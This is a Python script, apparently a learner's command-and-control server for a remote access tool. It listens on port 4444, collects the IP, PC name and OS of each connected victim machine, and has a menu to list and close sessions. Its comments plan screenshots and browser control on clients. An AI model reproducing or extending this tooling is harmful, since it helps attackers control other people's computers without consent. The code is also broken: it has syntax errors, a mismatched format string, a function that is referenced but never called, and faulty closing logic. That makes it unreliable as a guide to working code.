import socket, os, time, threading, sys
from queue import Queue

intThreads = 2

arrJobs = [1,2] #two jobs will be created so that will be stored in this list
queue = Queue() #to execute our job

arrAddresses = [] #to capture this adresses in the form of list
arrConnections = []

strHost = "xxx.xxx.xxx.xxx" 
intPort = 4444
intBuff = 1024 #maximum chracters that it can receive --> 1MB

decode_utf = lambda data: data.decode("utf-8") #function to return a decoded UTF-8
remove_quotes =  lambda string: string.replace("\"","") #This escape characters will identify that this is 
center =  lambda string, title: f"{{:^{len(string)}}}".format(title)    #Return your title centerd around the string
#to just remove or replace, so if there is a double quote --> replace with nothing; basically with the empty string
send = lambda data: conn.send(data) #function that will send the data
recv = lambda buffer:conn.recv(buffer) #to receive the data

def recvall(buffer): #this is the function that will get a large amount of data
    byData = b"" #included the byData
    while True:  #in order to accept that buffer 
        byPart = recv(buffer)
        if len(byPart) == buffer: #return everything that is inserted
            return byPart
        byData += byPart

        if len(byData) == buffer: #if that byte data, that we concatenate, is whole or not in order to check if it is 
            #complete data or not we have to check with this buffer that we sent
            return byData  #and if its the case --> return again that byData

def create_socket():
    global objSocket 
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #Use the adress (SO_REUSEADDR) if it was not connected properly

    except socket.error() as strError: #Connected the socket
        print("Error for creating the socket"+str(strError)) 

def socket_bind(): #Accept the IPv4 adress firmly in the form of the host and port (strHost, intPort)
    global objSocket
    try:
        print("Listening on the port: "+str(intPort))
        objSocket.bind((strHost,intPort)) #adress familiy representator --> take the form intto the tuple of host and port
        objSocket.listen(20)

    except socket.error() as strError: 
        print("Error for creating the socket"+str(strError))
        socket_bind()

def socket_accept(): #Will get the connection established between the server and the client
    while True:
        try: 
            conn, address = objSocket.accept() #if there is a connection established, it will get the connection and the adress
            conn.setblocking(1) #do not want the timeout
            arrConnections.append(conn)  #Add that array to the connection
            client_info = decode_utf(conn.recv(intBuff)).split("',")  #Important (l.16) --> if we do not decode it it is not going to work in pythons newer versions
            #conn.recv ---> check line 20; intBuff --> the data that we are going to get
            #client_info --> something like windows 10, information about the server etc... will be stored in there

            address +=client_info[0], client_info[1], client_info[2]
            arrAddresses.append(address)          #accept everthing as an incoming connection that is coming to the server
            print("\n" + "Connection has been succesfully established : {0} ({1])" .format(address[0], address[2])) #address[0] is the IP; address[2] is pc information
            #--> formatted

        except socket.error:
            print("!Error accepting connections!")
            continue

def menu_help():
    print("\n "+" --help")
    print("--l") #--> List all connections

def central_menu():
    while True: #Loop; cause the user should be able to execute multiple commands
        strChoice = input("\n "+">")
        if strChoice == "--l": #list connections

            list_connections():  # type: ignore
        elif strChoice == "--x":
            close()
            break
        else:
            print("Invalid, please try again :)")
        menu_help()

def close(): #Close the connection
    global arrConnections, arrAddresses

    if len(arrAddresses) == 0:      #Check if the adresses are empty or not

        for intCounter, conn in enumerate(arrConnections): 
            conn.send(str.encode("exit"))
            conn.close()
        del arrConnections; arrConnections =[]
        del arrAddresses; arrAddresses =[]

def list_connections():
    if len(arrConnections) > 0: #to check if there is any connection
        strClients = ""
        for intCounter, conn in enumerate(arrConnections):
            strClients += str(intCounter) + 4*" " +str(arrAddresses[intCounter][0]) +4*"   " + \ 
            #creating spaces; just want to get the client Ip
            str(arrAddresses[intCounter][1]) + 4*"  "+ str(arrAddresses[intCounter[2]]) +4*"   " + \  
            #IP 0, Portname 1, PC-Name 2, OS 3
            str(arrAddresses[intCounter][3]) + "\n" 

        print("\n" + "ID" +3*" "+center(str(arrAddresses[0][0]), "IP") + 4* " "+  
                center(str(arrAddresses[0][1]), "Port") +4*" "+
                center(str(arrAddresses[0][2]), "PC-Name") +4*" "+
                center(str(arrAddresses[0][3]), "OS")+ "\n" +strClients, end= "")
    else:
        print("No connections available.")

#---------MULTITHREADING------------#

def create_threads():
    for _ in range(intThreads):
        objThread  = threading.Thread(target=work) #https://docs.python.org/3/library/threading.html(class threading.Thread)
        objThread.daemon = True #to execute the main thread
        objThread.start()

    queue.join()

def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept
        elif intValue == 2: #there can be two jobs, do that job based on the queue
            while True:
                time.sleep(0.2)
                if len(arrAddresses) > 0: ##--> this is going to be our central_menu
                    break 
        queue.task_done() #
        queue.task_done()
        sys.exit(0)
#if there was 1 for example created a connection, the 2 is for the menu; 2--> doing some tasks like taking screeenshots, open browser, giving message to client

def create_jobs(): #created the job; put the thread id into the list
    for intThreads in arrJobs:
        queue.put(intThreads)
    queue.join()

create_threads()
create_jobs()
